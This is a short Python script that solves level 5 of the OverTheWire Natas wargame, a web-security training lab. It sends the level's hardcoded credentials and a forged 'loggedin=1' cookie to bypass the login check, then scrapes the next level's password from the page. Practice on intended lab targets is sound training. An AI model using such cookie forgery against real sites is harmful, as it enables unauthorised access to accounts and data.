import re
import requests

level=5
creds = ('natas5','iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq')
url   = 'http://natas%s.natas.labs.overthewire.org' % level
header = {'Cookie': 'loggedin=1'}


session = requests.Session()
response = session.get(url,auth=creds)
response = session.get(url,auth=creds,headers=header)
data = response.text
print(re.findall('Access granted. The password for natas6 is (.*)</div>',data))